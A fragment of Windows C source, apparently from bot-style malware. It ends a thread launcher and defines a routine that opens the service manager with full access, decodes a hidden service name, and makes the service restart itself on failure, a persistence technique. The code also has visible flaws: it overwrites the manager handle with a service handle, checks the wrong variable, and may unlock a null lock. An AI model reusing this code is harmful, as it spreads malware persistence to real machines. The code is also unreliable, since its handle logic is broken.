	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Bthd, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	ExitThread(0);
}

BOOL ReconfigureService(LPSTR lpDesc) 
{ 
    SC_HANDLE service;
	SC_LOCK sclLock; 
	SC_ACTION scBuf;
	LPQUERY_SERVICE_LOCK_STATUS lpqslsBuf; 
	SERVICE_DESCRIPTION sdBuf;
	SERVICE_FAILURE_ACTIONS sfBuf;
	DWORD dwBytesNeeded; 
	BOOL bSuccess=TRUE;
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return FALSE;
	if(!(service = fOpenService(scm, Decode(servicename), SERVICE_ALL_ACCESS)))
		return FALSE;
	if (!(sclLock = fLockServiceDatabase(scm))) 
	{
		if (GetLastError() != ERROR_SERVICE_DATABASE_LOCKED) 
			return FALSE;
		lpqslsBuf = (LPQUERY_SERVICE_LOCK_STATUS) LocalAlloc(LPTR,sizeof(QUERY_SERVICE_LOCK_STATUS)+256); 
		if (lpqslsBuf == NULL) 
			return FALSE;
		if (!fQueryServiceLockStatus(scm, lpqslsBuf, sizeof(QUERY_SERVICE_LOCK_STATUS)+256, &dwBytesNeeded)) 
			return FALSE;
		LocalFree(lpqslsBuf); 
	}
	scm = fOpenService(scm, Decode(servicename), SERVICE_CHANGE_CONFIG);
	if (service == NULL) 
		return FALSE;
	scBuf.Delay=3000;
	scBuf.Type=SC_ACTION_RESTART;
	sfBuf.lpsaActions=&scBuf;
	sfBuf.cActions=1;
	sfBuf.lpCommand=0;
	sfBuf.lpRebootMsg=0;
	sfBuf.dwResetPeriod=10;
	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfBuf))
		bSuccess = FALSE;
	sdBuf.lpDescription = lpDesc;
	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_DESCRIPTION, &sdBuf))
		bSuccess = FALSE;
	fUnlockServiceDatabase(sclLock); 
	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);
	return bSuccess;
}
#endif
